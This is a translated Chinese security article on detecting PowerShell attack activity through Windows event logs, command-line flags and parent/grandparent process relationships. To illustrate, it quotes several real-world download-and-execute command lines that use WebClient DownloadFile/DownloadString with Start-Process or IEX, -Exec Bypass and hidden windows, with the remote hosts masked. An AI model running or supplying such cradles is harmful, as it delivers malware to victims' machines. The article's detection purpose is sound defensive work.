# 【技术分享】如何检测PowerShell攻击活动
|
##### 译文声明
本文是翻译文章，文章来源：securityaffairs.co
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
译者：[兴趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**一、前言**
最近一阶段，我一直在分析研究客户网络环境中的PowerShell攻击活动。根据分析及研究成果，我梳理出了一些特征，利用这些特征，我们可以使用Windows事件日志来检测环境中潜在的PowerShell攻击活动。在本文中，首先我们来梳理一下PowerShell在实际攻击活动中的使用场景，其次，我们再研究一下相应的检测机制。
**二、PowerShell在攻击活动中的应用**
众所周知，PowerShell非常强大，我们已经看到越来越多的攻击者选择PowerShell作为攻击手段。PowerShell是微软Windows操作系统中自带的软件包，因此，攻击者可以在受害者主机中随时使用这款工具。
“（在攻击活动中）Powershell主要承担了下载器（downloader）角色”。
在实际观察到的攻击活动中，PowerShell的主要作用是从远程位置下载恶意文件到受害者主机中，然后使用诸如 **Start-Porcess** 、
**Invoke-Item** 或者 **Invoke-Expression** （ **-IEX**
）之类的命令执行恶意文件，PowerShell也可以将远程文件直接下载到受害者主机内存中，然后从内存中执行。
实际攻击活动中经常使用到 **System.net.Webclient** 中的两种方法：
    (New-object System.net.webclient).DownlodFile() 
    (New-object System.net.Webclient).DownloadString()
**2.1 (New-object System.net.webclient).DownlodFile()**
该方法最简单的一种使用场景如下图所示（我们可以使用类似Xampp之类的平台搭建http(s)服务器环境，来测试这种方法的功能）。
如上图所示，利用这种方法，攻击者可以将目标文件（`evilfile.txt`）下载到`$Appdata`环境变量所对应的`C:Userskirtar_ozaAppDataRoaming`路径中，然后使用“
**Invoke-Item** ”命令执行这个文件。
在实际攻击活动中，我们曾见过如下用法：
    C:WindowsSystem32WindowsPowerShellv1.0powershell.exe" -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://**********.com/***/**.dat', $env:APPDATA + '***.exe'); Start-Process $env:APPDATA'***.exe
如上述代码所示，攻击者使用`.downloadfile()`方法下载远程文件，利用环境变量，将该文件存放到用户的appdata目录，然后使用“
**Start-Process** ”来执行下载的二进制文件。
我们还在实际攻击活动中见过如下案例，攻击者使用PowerShell下载并执行远程文件：
    C:WINDOWSSysWOW64WindowsPowerShellv1.0powershell.exe" iex $env:vlbjkf
    C:WINDOWSSysWOW64WindowsPowerShellv1.0powershell.exe" Invoke-Expression $env:imumnj
    C:WindowsSystem32cmd.exe" /c PowerShell "'PowerShell ""function Bdabgf([String] $hcre){(New-Object System.Net.WebClient).DownloadFile($hcre,''C:Users***AppDataLocalTemp****.exe'');Start-Process   ''C:Users****AppDataLocalTemp****.exe'';}try{Bdabgf(''http://*****.com/****.png'')}catch{Bdabgf(''http://*****.de/***.png'')}'"" | Out-File -encoding ASCII -FilePath C:Users****AppDataLocalTemp*****.bat;Start-Process 'C:Users*****AppDataLocalTemp******.bat' -WindowStyle Hidden"
**2.2 (New-object System.net.Webclient).DownloadString()**
`DownloadString()`并不会将文件下载到磁盘中，相反，该方法会将远程文件的内容直接载入受害者主机的内存中。这些文件通常为恶意脚本，攻击者可以使用Powershell的`–Command`参数在内存中直接执行这些文件。无文件恶意软件中经常用到这种技术，以便在内存中直接执行恶意脚本，而无需将任何文件保存到磁盘中。攻击者经常使用这种技术来绕过基于特征的检测机制。
这种方法最简单的一种使用场景如下所示：
`cmd.js`是一个远程脚本，可以从受害者主机的内存中直接启动`calc.exe`进程，无需将任何文件保存到磁盘上（注意：只需利用记事本打开`calc.exe`并将其保存为`.js`文件即可）。
实际攻击活动中，我们曾见过如下用法：
    powershell  -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('hxxp://******** [.]com/***/**.mdf', $env:APPDATA + '***.exe'); Start-Process $env:APPDATA'***.exe';(New-Object System.Net.WebClient).DownloadString('hxxp://nv******[.]com/s.php?id=po**')
如上所示，攻击者用到了前面提到的两种方法，他们使用downloadstring()从远程主机下载某些php代码。
**  
**
**三、使用某些PowerShell“标志”来隐藏操作痕迹**
攻击者会使用PowerShell中提供的各种选项，尽可能隐藏自己的操作痕迹。以下标志经常在实际攻击活动中出现，我们可以利用这些标志来梳理出一份IOC（Indicators
of Compromise，攻击指示器）清单：
1、 **–WindowStyle hidden / -w hidden** ：对用户隐藏PowerShell程序窗口，以隐藏操作痕迹。
2、 **–Exec Bypass** ：用来绕过或者忽略类似 **Restricted** 的执行限制策略，这些策略会阻止PowerShell脚本运行。
3、 **–Command / -c** ：从PowerShell终端中执行任意命令。
4、 **–EncodedCommand / -e / -Enc** ：在命令行中，将经过编码的参数传递给PowerShell加以执行。
5、 **–Nop / -Noprofile** ：忽略配置（Profile）文件中的命令。
你可以在前面列举的几个例子中查找这些标志，理解“ **-nop -Exec Bypass –Command** ”标志的用法。
实际环境中，攻击者会使用各种标志开展攻击活动，某些例子如下所示：
    C:WINDOWSsystem32cmd.exe /c powershell.exe -nop -w hidden -c IEX (new-object net.webclient).downloadstring('http://****.com/Updates')
    PowersHell –e  
    Powershell – Enc 
**  
**
**四、IoC**
接下来，我们来看看实际环境中，哪些攻击指示器（IoC）可以用来检测可疑的PowerShell活动。
**4.1 观察PowerShell进程的层级关系**
通常情况下，当我们从Windows开始菜单或者从磁盘中运行PowerShell时，PowerShell进程会作为`explorer.exe`的子进程来运行：你可以使用[Process
Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)或者[Process
Hacker](http://processhacker.sourceforge.net/downloads.php)工具来观察进程的父子层级关系。
如上图所示，`Explorer.exe`为`Powershell.exe`的父进程。
大多数情况下，在PowerShell攻击活动中，攻击者会通过命令行进程来运行PowerShell脚本或命令，此时，我们通常可以观察到PowerShell进程的父进程为`cmd.exe`，这在实际攻击活动中非常常见。
然而，在某些合法场景中，PowerShell进程的父进程也是`cmd.exe`，比如管理员有时候希望运行某些PowerShell脚本，然后他会通过命令提示符（`cmd.exe`）来启动PowerShell。
“因此，查看祖父进程也是非常重要的一件事情，你可以查看是哪个进程启动了`cmd.exe`，这个信息可以帮助你分析这种场景是否属于攻击活动的一部分。”
因此，如果祖父进程为`winword.exe`、`winword.exe`或者`wuapp.exe`，这种情况表明，某个脚本启动了`cmd.exe`，我们需要好好研究一下这是个什么脚本。
“在某些情况下，我们可以观察到PowerShell进程由`windword.exe`直接启动运行，这是可疑活动的明显标志，我们需要记录下这类活动并加以分析。”